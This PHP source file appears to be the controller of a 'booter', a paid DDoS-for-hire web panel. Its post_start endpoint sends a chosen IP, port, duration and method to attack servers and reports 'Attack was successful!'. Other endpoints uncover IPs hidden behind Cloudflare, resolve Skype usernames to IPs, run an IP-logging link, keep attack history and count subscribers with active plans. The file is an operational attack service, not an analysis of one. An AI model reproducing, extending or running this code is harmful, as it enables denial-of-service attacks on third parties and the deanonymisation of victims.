<?php
/**
 * User: Rogier
 * Date: 14-2-13
 * Time: 20:50
 *
 */
class Booter_Controller extends Base_Controller
{
    public $restful = true;

    public function __construct()
    {
        $this->filter('before', array('auth', 'booter'))->except(array('start', 'onlineservers'));
    }


    public function get_index()
    {
        if(!Booter::status()) return View::make('msg.error')->with('error', 'We\'re sorry to inform you that the booter is currently offline. <br /> It will be brought back online as soon as possible!');

        return View::make('page.booter.index');
    }

    public function post_start()
    {
        $booter = Booter::getInstance();
        $response = $booter->boot(Input::get('ip'), Input::get('time'), Input::get('port'), Input::get('method'));
        if($response === true)
        {
            if(Input::get('method') == 'stop') return 'Successfully sent stop commands to servers.';
            return 'Attack was successful!';
        }
        else
        {
            return $response;
        }
    }

    public function post_cfresolve()
    {
        return Resolver::cloudflareResolve(Input::get('hostname'));
    }

    public function post_ipresolve()
    {
        return Resolver::ipResolve(Input::get('hostname'));
    }

    public function post_skyperesolve()
    {
        return Resolver::skypeResolve(strtolower(Input::get('skypeusername')));
    }
    public function post_georesolve()
    {
        return Resolver::geoResolve(Input::get('geoip'));
    }
    public function post_downornot()
    {
        return Resolver::downornot(Input::get('host'));
    }


    public function post_savenotes()
    {
        $notes = Input::get('notes');
        Auth::user()->notes = $notes;
        Auth::user()->save();
        return 'saved at '. date('Y-m-d H:i:s', time());
    }


    public function get_history()
    {
        return View::make('page.booter.history')->with('attacks', Auth::user()->attacks()->order_by('created_at', 'DESC')->paginate(50));
    }

    public function get_iplogrefresh()
    {
        $logs = IPLog::where('user_id', '=', Auth::user()->id)->get();
        if(empty($logs)) return View::make('msg.errorn')->with('error', 'You have not logged any IP addresses yet.');
        $str = '<table class="table table-condensed">
                <thead>
                    <th>IP address</th>
                    <th>First log at</th>
                    <th>Last seen at</th>
                </thead>
                <tbody>
                ';
        foreach($logs as $log)
        {
            $str .= '
                <tr>
                    <td>'. htmlspecialchars($log->ip) .'</td>
                    <td>'. date('Y-m-d H:i', strtotime($log->created_at)) .'</td>
                    <td>'. date('Y-m-d H:i', strtotime($log->updated_at)) .'</td>
                </tr>
            ';
        }
        $str .= '</tbody></table>';

        return $str;
    }

    public function post_savelink()
    {
        $url = Input::get('link');

        if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i", $url)) return 'badlink';

        Auth::user()->iplog_link = $url;
        Auth::user()->save();
        return 'ok';
    }

    public function get_onlineservers()
    {
        return Server::getOnline();
    }


    public function get_getstats()
    {
        $data = array(
            Server::count(),
            Server::getOnline(),
            Attack::count(),
            Attack::where( DB::raw('(created_at + INTERVAL time SECOND)'), '>', DB::raw( 'NOW()' ) )->count(),
            User::count(),
            User::where(DB::raw('updated_at'), '>', DB::raw('NOW() - INTERVAL 10 MINUTE'))->count(),
            User::where(DB::raw('DATE(plan_expiry_date)'), '>', DB::raw('CURDATE()'))->count()
        );
        return json_encode($data);
    }


}